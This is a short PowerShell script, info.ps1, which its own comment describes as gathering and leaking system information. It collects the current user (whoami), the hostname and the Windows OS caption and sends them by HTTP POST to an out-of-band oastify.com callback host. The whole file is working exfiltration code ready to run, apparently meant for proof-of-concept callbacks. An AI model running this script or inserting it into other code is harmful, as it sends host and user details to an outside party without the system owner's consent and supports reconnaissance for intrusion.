# info.ps1 - Gathers and leaks system info via HTTP POST
$data = whoami + "_" + hostname + "_" + (Get-WmiObject Win32_OperatingSystem).Caption
Invoke-WebRequest -Uri "http://2mputrvkxjz4wztee8zhobjwa2lqstg1.oastify.com" -Method POST -Body $data
